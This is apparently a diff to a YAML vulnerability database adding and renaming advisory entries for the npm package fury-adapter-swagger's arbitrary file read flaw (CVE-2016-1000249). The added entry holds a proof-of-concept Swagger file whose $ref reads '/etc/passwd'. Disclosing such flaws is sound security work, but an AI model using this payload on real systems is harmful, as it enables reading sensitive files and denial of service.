@@ -1,5 +1,45 @@
 ---
-- id: ossindex:npm:fury-adapter-swagger:2017-07-29
+- id: npmjs:npm:fury-adapter-swagger:305
+  title: Arbitrary File Read
+  description: |-
+    Affected versions of `fury-adapter-swagger` have a weakness that allows an attacker to read arbitrary files off of the system. This can be used to read sensitive data, or to cause a denial of service condition by attempting to read something like `/dev/zero`.
+
+    ## Proof of Concept:
+
+    ```
+    ---
+    swagger: '2.0'
+    info:
+      title: Read local files
+      version: '1.0'
+
+    paths:
+      /foo:
+        get:
+          responses:
+            200:
+              description: Some description
+              examples:
+                text/html:
+                  example:
+                    $ref: '/etc/passwd'
+    ```
+  affected_package: fury-adapter-swagger
+  vulnerable_versions:
+  - ">= 0.2.0 <= 0.9.6"
+  - "~0.8.0-pre"
+  severity: critical
+  package_manager: npm
+  cve:
+  - CVE-2016-1000249
+  cwe: CWE-22
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Honza Javorek
+  references: https://npmjs.com/advisories/305
+  source_url: https://npmjs.com/advisories/305
+- id: ossindex:npm:fury-adapter-swagger:8405000439
   title: Directory Traversal
   description: "> [The package] has a vulnerability that allows arbitrary file reads
     off the file system. This could be used to retrieve sensitive data, or cause a
@@ -18,7 +58,7 @@
   - https://github.com/distributedweaknessfiling/DWF-Database-Artifacts/blob/master/DWF/2016/1000249/CVE-2016-1000249.json
   - https://nodesecurity.io/advisories/305
   source_url: https://ossindex.net/resource/package/8321077215/vulnerabilities
-- id: snykio:npm:fury-adapter-swagger:CVE-2016-1000249
+- id: snykio:npm:fury-adapter-swagger:20161024
   title: Directory Traversal
   description: |
     [`fury-adapter-swagger`][1] is Swagger 2.0 parser for Fury.js.
